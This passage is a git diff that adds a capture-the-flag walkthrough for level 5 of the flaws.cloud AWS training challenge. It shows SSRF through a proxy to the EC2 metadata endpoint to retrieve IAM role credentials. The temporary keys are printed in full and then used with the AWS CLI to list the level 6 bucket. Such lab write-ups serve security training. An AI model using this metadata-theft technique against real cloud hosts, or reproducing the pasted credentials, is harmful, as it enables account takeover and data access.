@@ -543,6 +543,87 @@ Visit: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
 ### Level 5:
 Visit: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
 
+Try to access: http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/eee30939-c442-46fb-81d1-d06f1a8d9efc)
+
+Navigate: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e2531bf1-a520-4e46-bba9-43fb497a10a7)
+
+Then navigate: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/047bb707-a506-4e0b-8cd7-64f7c66ba919)
+
+Check: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/c7ef491d-f6f0-428c-adc7-5380e44800b1)
+
+IAM account name is **flaws**, and get credentials: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/a1bd95c1-c446-4cac-b7ed-720720e7da9b)
+
+```
+{
+  "Code" : "Success",
+  "LastUpdated" : "2024-06-04T20:29:23Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA6GG7PSQG3HVVD76 Y",
+  "SecretAccessKey" : "KEbQ8hY4gv5kqUxhJ43PbMvSTzMsX/4LaYThMQR 1",
+  "Token" : "IQoJb3JpZ2luX2VjECUaCXVzLXdlc3QtMiJIMEYCIQDcPLruojywlrWbpzhbKwQy+THMF309OcJvcnERQNav6QIhAKqWln4+7HBI5mkIOMOsL8R+Yb1MHjVc73Wjv65aynJ8KrsFCK7//////////wEQBBoMOTc1NDI2MjYyMDI5Igx/MsX54m63o7gEISYqjwX636l2Jk0pVvJBZEU0qNTCtrw+CxE8ldm3dNP6Bm4lS89NGYCcLvlneeqNsGxraWtpoF/lNQEy1eJ1r91GCJAxYJlRNfd+F69g/R1RTweA4UooiSCERZgGlk8xcwzGyIH+wst4u0G7vJNpy0IDURy8dnnNuhn11/cxDUCcTB06fvYiRXDCeHxllAWzRmtJpJuhDETVvumgzcaSfBcoCZlIUi1npWRNE/9aX2C0JrvfnhbyLJDehUicH4sW2qb/phqNimh2juhpxbYBIkBCAXxrxFVnm0nE6/w7tds5Dn2ZAOcBXu0nhulBjyBHJINprkqVpyo91bZi4r7OaxUYRBNnWwdfpcUTLlHaNLnXaKgegTwJ7fnOdMEDHCFb8BCybBRAc7CiEiYT6RDD0tGE5c/RNy0p4jeODsKDe0hFSZi0C+ls+y/f3X+QmGWO1BFsoIkjzmCjdvdmZ/R2xAWzJPZnGM8D4fVxTJoD6zqj2g6W778n28hgoJucIr5Zboe4P9h9mA7IQ4PperDwKoszyCZU5vQs6Pnlf7Xp4FCDO/F/QpWu+BWJ1f6YmzBSVP9c0kX5jEiDTwOx/BZ2mNzaXfELhGTR/9kZJ/nLcnopPzpthH3Awu35aNFvAulGUM4uNb58aMyEs4qxohxGXn5Ahw6XIw9EoYqCNvQ8tsQ9P01MzcYTqwdv5/OGC3hGWNF27NKO0ZooAdr7+PqzhHN3OAcMcJfQz/oITPoucOrph1S5hdlOBKiE3np5b3sEhN8ShcupWpcaacNYCHjaax4BorauCw5qEg2wTLSefVLWbjvDzDN1c0XxeG8HZcHtMSgEWpgR+lUK7f43mwaUWltIM7ZXteB5Ffbqdq8LKS7UK7QoMJPy/bIGOrABatVLfDzRUkZLLBSHlmC/X28w+JZHGQ4PqKcwabQQtd2/4jbiLr/yfInrVRdx0bJxrIgiOpwtR3LHMlq8VchNN2SgI57fXXZLKIwEvo8gQramRS8fSY1g7dUhkz8h97GPRQ7lFY/I5AfybSaUb1y+tsKsXP8vXp3pahf30HAjTQmFb8OCSHZHF9gCWrJwdLOf7x7Iw85uEi0vLhNHBFilKjDc1bex2pPjGOyEIeSKNdk =",
+  "Expiration" : "2024-06-05T02:38:15Z"
+}
+```
+
+
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $nano ~/.aws/credentials
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $tail -n 4 ~/.aws/credentials
+[level5]
+AWS_ACCESS_KEY_ID=ASIA6GG7PSQG3HVVD76 Y
+AWS_SECRET_ACCESS_KEY=KEbQ8hY4gv5kqUxhJ43PbMvSTzMsX/4LaYThMQR 1
+AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjECUaCXVzLXdlc3QtMiJIMEYCIQDcPLruojywlrWbpzhbKwQy+THMF309OcJvcnERQNav6QIhAKqWln4+7HBI5mkIOMOsL8R+Yb1MHjVc73Wjv65aynJ8KrsFCK7//////////wEQBBoMOTc1NDI2MjYyMDI5Igx/MsX54m63o7gEISYqjwX636l2Jk0pVvJBZEU0qNTCtrw+CxE8ldm3dNP6Bm4lS89NGYCcLvlneeqNsGxraWtpoF/lNQEy1eJ1r91GCJAxYJlRNfd+F69g/R1RTweA4UooiSCERZgGlk8xcwzGyIH+wst4u0G7vJNpy0IDURy8dnnNuhn11/cxDUCcTB06fvYiRXDCeHxllAWzRmtJpJuhDETVvumgzcaSfBcoCZlIUi1npWRNE/9aX2C0JrvfnhbyLJDehUicH4sW2qb/phqNimh2juhpxbYBIkBCAXxrxFVnm0nE6/w7tds5Dn2ZAOcBXu0nhulBjyBHJINprkqVpyo91bZi4r7OaxUYRBNnWwdfpcUTLlHaNLnXaKgegTwJ7fnOdMEDHCFb8BCybBRAc7CiEiYT6RDD0tGE5c/RNy0p4jeODsKDe0hFSZi0C+ls+y/f3X+QmGWO1BFsoIkjzmCjdvdmZ/R2xAWzJPZnGM8D4fVxTJoD6zqj2g6W778n28hgoJucIr5Zboe4P9h9mA7IQ4PperDwKoszyCZU5vQs6Pnlf7Xp4FCDO/F/QpWu+BWJ1f6YmzBSVP9c0kX5jEiDTwOx/BZ2mNzaXfELhGTR/9kZJ/nLcnopPzpthH3Awu35aNFvAulGUM4uNb58aMyEs4qxohxGXn5Ahw6XIw9EoYqCNvQ8tsQ9P01MzcYTqwdv5/OGC3hGWNF27NKO0ZooAdr7+PqzhHN3OAcMcJfQz/oITPoucOrph1S5hdlOBKiE3np5b3sEhN8ShcupWpcaacNYCHjaax4BorauCw5qEg2wTLSefVLWbjvDzDN1c0XxeG8HZcHtMSgEWpgR+lUK7f43mwaUWltIM7ZXteB5Ffbqdq8LKS7UK7QoMJPy/bIGOrABatVLfDzRUkZLLBSHlmC/X28w+JZHGQ4PqKcwabQQtd2/4jbiLr/yfInrVRdx0bJxrIgiOpwtR3LHMlq8VchNN2SgI57fXXZLKIwEvo8gQramRS8fSY1g7dUhkz8h97GPRQ7lFY/I5AfybSaUb1y+tsKsXP8vXp3pahf30HAjTQmFb8OCSHZHF9gCWrJwdLOf7x7Iw85uEi0vLhNHBFilKjDc1bex2pPjGOyEIeSKNdk =
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws sts get-caller-identity --profile level5
+{
+    "UserId": "AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783",
+    "Account": "975426262029",
+    "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/115a90aa-9950-4173-8d47-c54729016dde)
+
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile level5
+                           PRE ddcc78ff/
+2017-02-27 07:41:07        871 index.html
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ --profile level5
+2017-03-03 10:06:23       2463 hint1.html
+2017-03-03 10:06:23       2080 hint2.html
+2020-05-23 00:12:20       2924 index.html
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/49a585a0-1356-4a64-914a-880f8515191e)
+
+Navigate: ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e4fc3577-cf77-43da-94e3-10a740cb93de)
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/72e3d17a-6bab-49fe-98ad-509f310fe9a9)
+
+
+### Level 6:
+Visit: http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
+
+
+
+
+
+
+
 
 
 
